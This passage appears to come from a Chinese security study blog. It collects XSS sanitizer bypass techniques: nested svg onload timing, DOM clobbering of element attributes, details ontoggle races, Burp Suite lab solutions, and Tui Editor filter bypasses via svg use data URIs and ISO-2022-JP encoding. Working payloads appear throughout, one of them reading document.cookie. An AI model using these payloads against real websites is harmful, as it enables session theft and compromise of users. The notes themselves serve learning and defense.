<p>两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 <code>&lt;svg onload=alert(1)&gt;</code> ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败</p>
<p>当我们没有正确闭合标签的时候，如 <code>&lt;svg&gt;&lt;svg&gt;</code> ，就可能调用到 <code>PopAll</code>  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 <code>PopCommon</code> 。这两个函数有一个共同点，都会调用栈中元素的 <code>FinishParsingChildren</code>  函数。这个函数用于处理子节点解析完毕以后的工作。</p>
<p><code>FinishParsingChildren</code>  有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>
<p>最外层 svg 的 <code>load</code>  事件由 <code>LocalDOMWindow::dispatchWindowLoadEvent</code>  触发；而其他 svg 的 <code>load</code>  事件则在达到结束标记的时候触发。</p>
<p>先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行</p>
<p>当没有过滤代码时：&lt;svg onload=console.log (“svg0”)&gt;&lt;svg onload=console.log (“svg1”)&gt;&lt;svg onload=console.log (“svg2”)&gt;</p>
<p>触发顺序为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">svg2</span><br><span class="line">svg1</span><br><span class="line">DOMContentLoaded</span><br><span class="line">svg0</span><br><span class="line">load</span><br></pre></td></tr></table></figure>
<p>套嵌的 svg 之所以成功，是因为当页面为 <code>root.innerHtml</code>  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中<strong>会触发非最外层 svg 标签的 <code>load</code>  事件，最终成功执行代码</strong>。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。</p>
<p>1.3<svg onload=alert(1)> 失败原因</p>
<p>这里有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>
<p><code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>
<p>最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。</p>
<p>method 2. 使用 input 破坏 DOM</p>
<p><code>&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;</code>   <code>&lt;form style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;</code>   <code>&lt;input id=&quot;attributes&quot;&gt;&lt;input id=&quot;attributes&quot;&gt;</code></p>
<p>此时 for 循环中 el.attributes 抓到的是 form 的子标签，form 没有执行循环</p>
<p>或者</p>
<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;img id=attributes&gt;&lt;img id=attributes&gt;&lt;/form&gt;</code></p>
<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;input id=attributes&gt;&lt;input id=attributes&gt;&lt;/form&gt;</code></p>
<p>tabindex 的作用：</p>
<p>设置 tab 选中的标签，tabindex=1 或 - 1，代表开始就选中，如果只有一个，只要有 tabindex 默认就选中</p>
<p>需要两个 input 因为有两个 input 时组成了一个 htmlcollection，是可迭代对象。删除 name 的属性后 input 标签仍然可以 onfocus 实现弹窗</p>
<p>onfoucs 是 input 属性，form 中必须有 input 才能聚焦</p>
<p>method 3. 利用 details 弹窗</p>
<p><code>ParseAttribute</code>  正是在解析文档处理标签属性的时候被调用的。注释也写到了，分发 toggle 事件的操作是异步的。</p>
<p><strong>details 标签的 toggle 事件是异步触发的，并且直接对 details 标签的移除不会清除原先通过属性设置的异步任务</strong></p>
<p>将 details 改为同步执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">data</span> = <span class="title function_ invoke__">decodeURIComponent</span>(location.hash.<span class="title function_ invoke__">substr</span>(<span class="number">1</span>));;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">root</span> = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">root.innerHTML = data;</span><br><span class="line"><span class="title function_ invoke__">setTimeout</span>( () =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (let el of root.<span class="title function_ invoke__">querySelectorAll</span>(<span class="string">&#x27;*&#x27;</span>)) &#123;</span><br><span class="line">     let attrs = [];</span><br><span class="line">     <span class="keyword">for</span> (let attr of el.attributes) &#123;</span><br><span class="line">      attrs.<span class="title function_ invoke__">push</span>(attr.name);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span> (let name of attrs) &#123;</span><br><span class="line">      el.<span class="title function_ invoke__">removeAttribute</span>(name);</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    document.body.<span class="title function_ invoke__">appendChild</span>(root)</span><br><span class="line">&#125; , <span class="number">2000</span>)</span><br></pre></td></tr></table></figure>
<p>这样保证了 alert 一定会在 js 删除之前执行，执行点在 innerHTML</p>
<p>如果没有弹出，可能在 js 删除之后才执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const data = decodeURIComponent(location.hash.substr(1));;</span><br><span class="line">const root = document.createElement(&#x27;div&#x27;);</span><br><span class="line">root.innerHTML = data;</span><br><span class="line"></span><br><span class="line">let details = root.querySelector(&quot;details&quot;)</span><br><span class="line">root.removeChild(details)</span><br><span class="line"></span><br><span class="line">for (let el of root.querySelectorAll(&#x27;*&#x27;)) &#123;</span><br><span class="line"> let attrs = [];</span><br><span class="line"> for (let attr of el.attributes) &#123;</span><br><span class="line">  attrs.push(attr.name);</span><br><span class="line"> &#125;</span><br><span class="line"> for (let name of attrs) &#123;</span><br><span class="line">  el.removeAttribute(name);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>details 异步执行是将执行函数放入一个事件队列中，只要事件不停止，在放入事件队列中，删除 details 已经没用，事件队列仍会执行</p>
<p>details 有延迟的话肯定执行成功，因为此时异步事件已经执行完成，执行点在 innerhtml 如果没有延迟，有可能在 js 删除属性之后，异步事件才执行完成</p>
<h2 id="dom-clobbering-burp-suite"><a class="markdownIt-Anchor" href="#dom-clobbering-burp-suite">#</a> Dom Clobbering - Burp Suite</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MDkwNjM2NzktYzAxY2IzM2EtYWQ2MS00ZTg0LTg2MTgtZGU1M2E4MjI4YjU4Lm1k">📎Exploiting DOM clobbering to enable XSS.md</span></p>
<h3 id="lab-exploiting-dom-clobbering-to-enable-xss"><a class="markdownIt-Anchor" href="#lab-exploiting-dom-clobbering-to-enable-xss">#</a> Lab: Exploiting DOM clobbering to enable XSS</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function displayComments(comments) &#123;</span><br><span class="line">    let userComments = document.getElementById(&quot;user-comments&quot;);</span><br><span class="line"></span><br><span class="line">    for (let i = 0; i &lt; comments.length; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        comment = comments[i];</span><br><span class="line">        let commentSection = document.createElement(&quot;section&quot;);</span><br><span class="line">        commentSection.setAttribute(&quot;class&quot;, &quot;comment&quot;);</span><br><span class="line"></span><br><span class="line">        let firstPElement = document.createElement(&quot;p&quot;);</span><br><span class="line"></span><br><span class="line">        let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class="line">        let avatarImgHTML = &#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;</span>&gt;</span>&#x27;;</span><br><span class="line"></span><br><span class="line">        let divImgContainer = document.createElement(&quot;div&quot;);</span><br><span class="line">        divImgContainer.innerHTML = avatarImgHTML</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">返回HTMLCollection(2) [a#test1, a#test1, test1: a#test1, test2: a#test1]</span><br><span class="line">通过test1取到collections中，test2取到第二个a</span><br><span class="line">--&gt; window.test1.test2</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;test1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test2&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">--&gt; node.attributes.length </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&quot;cid:&amp;quot;onerror=alert(2)&quot;//&gt;</span><br><span class="line">&lt;a id=defaultAvatar href=&quot;&quot;&gt;</span><br><span class="line">&lt;a id=defaultAvatar name=avatar href=&quot;1:&amp;quot;onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这里很明显我们可以用 Dom Clobbering 来控制  <code>window.defaultAvatar</code> ，只要我们原来没有头像就可以用一个构造一个 <code>defaultAvatar.avatar</code>  进行 XSS 了。</p>
<p>触发后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img class=&quot;avatar&quot; src=&quot;cid:&quot; onerror=&quot;alert(1)&quot;//&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>href 中的内容需要符合 dompurify 中的协议</p>
<p>至于为什么要用 a 标签，在 ok boomer 中有详细解释，因为 a 标签不继承 tostring 方法</p>
<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。最终把 href 中的内容放入 img 的 src 中</p>
<h3 id="labclobbering-dom-attributes-to-bypass-html-filters"><a class="markdownIt-Anchor" href="#labclobbering-dom-attributes-to-bypass-html-filters">#</a> Lab:Clobbering DOM attributes to bypass HTML filters</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype.clean = function (html) &#123;</span><br><span class="line">const sandbox = document.implementation.createHTMLDocument(&#x27;&#x27;);</span><br><span class="line">const root = sandbox.createElement(&quot;div&quot;);</span><br><span class="line">root.innerHTML = html;</span><br><span class="line"></span><br><span class="line">this._sanitize(sandbox, root);</span><br><span class="line"></span><br><span class="line">return root.innerHTML;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">HTMLJanitor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_sanitize</span> = <span class="keyword">function</span> (<span class="params"><span class="variable language_">document</span>, parentNode</span>) &#123;                                                                           </span><br><span class="line"><span class="keyword">var</span> treeWalker = <span class="title function_">createTreeWalker</span>(<span class="variable language_">document</span>, parentNode);</span><br><span class="line"><span class="keyword">var</span> node = treeWalker.<span class="title function_">firstChild</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!node) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (node.<span class="property">nodeType</span> === <span class="title class_">Node</span>.<span class="property">TEXT_NODE</span>) &#123;</span><br><span class="line">    <span class="comment">// If this text node is just whitespace and the previous or next element</span></span><br><span class="line">    <span class="comment">// sibling is a block element, remove it</span></span><br><span class="line">    <span class="comment">// N.B.: This heuristic could change. Very specific to a bug with</span></span><br><span class="line">    <span class="comment">// `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output</span></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> make this an option?</span></span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">data</span>.<span class="title function_">trim</span>() === <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &amp;&amp; ((node.<span class="property">previousElementSibling</span> &amp;&amp; <span class="title function_">isBlockElement</span>(node.<span class="property">previousElementSibling</span>))</span><br><span class="line">             || (node.<span class="property">nextElementSibling</span> &amp;&amp; <span class="title function_">isBlockElement</span>(node.<span class="property">nextElementSibling</span>)))) &#123;</span><br><span class="line">      parentNode.<span class="title function_">removeChild</span>(node);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">_sanitize</span>(<span class="variable language_">document</span>, parentNode);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove all comments</span></span><br><span class="line">  <span class="keyword">if</span> (node.<span class="property">nodeType</span> === <span class="title class_">Node</span>.<span class="property">COMMENT_NODE</span>) &#123;</span><br><span class="line">    parentNode.<span class="title function_">removeChild</span>(node);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">_sanitize</span>(<span class="variable language_">document</span>, parentNode);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> isInline = <span class="title function_">isInlineElement</span>(node);</span><br><span class="line">  <span class="keyword">var</span> containsBlockElement;</span><br><span class="line">  <span class="keyword">if</span> (isInline) &#123;</span><br><span class="line">    containsBlockElement = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">some</span>.<span class="title function_">call</span>(node.<span class="property">childNodes</span>, isBlockElement);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Block elements should not be nested (e.g. &lt;li&gt;&lt;p&gt;...); if</span></span><br><span class="line">  <span class="comment">// they are, we want to unwrap the inner block element.</span></span><br><span class="line">  <span class="keyword">var</span> isNotTopContainer = !! parentNode.<span class="property">parentNode</span>;</span><br><span class="line">  <span class="keyword">var</span> isNestedBlockElement =</span><br><span class="line">        <span class="title function_">isBlockElement</span>(parentNode) &amp;&amp;</span><br><span class="line">        <span class="title function_">isBlockElement</span>(node) &amp;&amp;</span><br><span class="line">        isNotTopContainer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> nodeName = node.<span class="property">nodeName</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> allowedAttrs = <span class="title function_">getAllowedAttrs</span>(<span class="variable language_">this</span>.<span class="property">config</span>, nodeName, node);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drop tag entirely according to the whitelist *and* if the markup</span></span><br><span class="line">  <span class="comment">// is invalid.</span></span><br><span class="line">  <span class="keyword">if</span> (isInvalid || <span class="title function_">shouldRejectNode</span>(node, allowedAttrs)</span><br><span class="line">      || (!<span class="variable language_">this</span>.<span class="property">config</span>.<span class="property">keepNestedBlockElements</span> &amp;&amp; isNestedBlockElement)) &#123;</span><br><span class="line">    <span class="comment">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class="line">    <span class="keyword">if</span> (! (node.<span class="property">nodeName</span> === <span class="string">&#x27;SCRIPT&#x27;</span> || node.<span class="property">nodeName</span> === <span class="string">&#x27;STYLE&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">while</span> (node.<span class="property">childNodes</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        parentNode.<span class="title function_">insertBefore</span>(node.<span class="property">childNodes</span>[<span class="number">0</span>], node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    parentNode.<span class="title function_">removeChild</span>(node);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">_sanitize</span>(<span class="variable language_">document</span>, parentNode);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sanitize attributes</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; node.<span class="property">attributes</span>.<span class="property">length</span>; a += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> attr = node.<span class="property">attributes</span>[a];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">shouldRejectAttr</span>(attr, allowedAttrs, node)) &#123;</span><br><span class="line">      node.<span class="title function_">removeAttribute</span>(attr.<span class="property">name</span>);</span><br><span class="line">      <span class="comment">// Shift the array to continue looping.</span></span><br><span class="line">      a = a - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sanitize children</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">_sanitize</span>(<span class="variable language_">document</span>, node);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ((node = treeWalker.<span class="title function_">nextSibling</span>()));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=x tabindex=0 onfocus=alert(document.cookie)&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>
<h2 id="tui_editor"><a class="markdownIt-Anchor" href="#tui_editor">#</a> Tui_editor</h2>
<p>常见的 Markdown 渲染器对于 XSS 问题有两种处理方式：</p>
<ul>
<li>在渲染的时候格外注意，在写入标签和属性的时候进行实体编码</li>
<li>渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤</li>
</ul>
<p>相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在 Markdown 里插入 HTML。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MTQwMDM2NTItZWUzMDYwMjItZTMxMS00N2Y5LWJkYjYtYzAzOWYwN2NmMTNmLm1k">📎Tui Editor 的 bypass 之路.md</span></p>
<blockquote>
<p>过滤过程是：</p>
<ol>
<li>先正则直接去除注释与 onload 属性的内容</li>
<li>将上面处理后的内容，赋值给一个新创建的 div 的 innerHTML 属性，建立起一颗 DOM 树</li>
<li>用黑名单删除掉一些危险 DOM 节点，比如 iframe、script 等</li>
<li>用白名单对属性进行一遍处理，处理逻辑是
<ul>
<li>只保留白名单里名字<strong>开头</strong>的属性</li>
<li>对于满足正则 <code>/href|src|background/i</code>  的属性，进行额外处理</li>
</ul>
</li>
<li>处理完成后的 DOM，获取其 HTML 代码返回</li>
</ol>
</blockquote>
<p>绕过 1：</p>
<p>使用 SVG 的 use 标签，use 的作用是引用本页面或第三方页面的另一个 svg 元素，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line">    &lt;circle id=&quot;myCircle&quot; cx=&quot;5&quot; cy=&quot;5&quot; r=&quot;4&quot; stroke=&quot;blue&quot;/&gt;</span><br><span class="line">    &lt;use href=&quot;#myCircle&quot;&gt;&lt;/use&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>use 的 href 属性指向那个被它引用的元素。但与 a 标签的 href 属性不同的是，use href 不能使用 JavaScript 伪协议，但可以使用 data: 协议。</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javascript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>data 协议中的文件必须是一个完整的 svg，而且整个 data URL 的末尾，需要有一个锚点 <code>#x</code>  来指向内部这个被引用的 svg。</p>
<p>对于 XSS sanitizer 来说，这个 Payload 只有 svg、use 两个标签和 href 一个属性，但因为 use 的引用特性，所以 data 协议内部的 svg 也会被渲染出来。</p>
<p>data 协议，base64 编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>绕过 2：</p>
<p>ISO-2022-JP 编码</p>
<p>ISO-2022-JP 编码在解析的时候会忽略 <code>\x1B\x28\x42</code> ，也就是 <code>%1B%28B</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;charset=ISO-2022-JP,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javas%1B%28Bcript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>即三种方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64</span><br><span class="line">Chrome ISO-<span class="number">2022</span>-JP</span><br><span class="line">&lt;details ontoggle=<span class="string">&quot;alert(1)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>
<p>或</p>
<p>通过条件竞争</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;details open ontoggle=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>补丁绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">export const TAG_NAME = &#x27;[A-Za-z][A-Za-z0-9-]*&#x27;;</span><br><span class="line">const reXSSOnload = new RegExp(`(&lt;$&#123;TAG_NAME&#125;[^&gt;]*)(onload\s*=)`, &#x27;ig&#x27;);</span><br><span class="line"></span><br><span class="line">export function sanitizeHTML(html: string) &#123;</span><br><span class="line">    const root = document.createElement(&#x27;div&#x27;);</span><br><span class="line"></span><br><span class="line">    if (isString(html)) &#123;</span><br><span class="line">        html = html.replace(reComment, &#x27;&#x27;).replace(reXSSOnload, &#x27;$1&#x27;);</span><br><span class="line">        root.innerHTML = html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1. 贪婪模式导致绕过</p>
<p>正则在标签名 <code>[A-Za-z][A-Za-z0-9-]*</code>  的后面，使用了 <code>[^&gt;]*</code>  来匹配非 <code>&gt;</code>  的所有字符。</p>
<p>如果此时有两个 <code>onload=</code> ，那么这个 <code>[^&gt;]*</code>  将会匹配到第二个，而将它删除掉，而第一个 <code>onload=</code>  将被保留。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;&lt;/svg&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>2. 非贪婪绕过</p>
